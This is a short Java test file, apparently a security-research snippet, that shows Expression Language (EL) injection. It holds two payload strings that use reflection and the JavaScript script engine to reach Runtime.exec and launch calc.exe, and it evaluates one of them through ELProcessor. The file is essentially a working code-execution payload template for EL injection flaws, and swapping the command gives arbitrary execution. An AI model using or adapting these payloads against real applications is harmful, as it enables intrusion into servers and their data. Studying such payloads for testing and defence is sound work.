package shell.EL;

import javax.el.ELProcessor;

public class test {
    public static void main(String[] args) throws Exception {
        String payload = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"var exp='calc';java.lang.Runtime.getRuntime().exec(exp);\")";

        String poc = "''.getClass().forName('javax.script.ScriptEngineManager')" +
                ".newInstance().getEngineByName('nashorn')" +
                ".eval(\"s=[3];s[0]='cmd.exe';s[1]='/c';s[2]='calc';java.lang.Runtime.getRuntime().exec(s);\")";

        ELeval(payload);
    }

    public static void ELeval(String payload){
        ELProcessor elProcessor = new ELProcessor();
        try {
            elProcessor.eval(payload);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
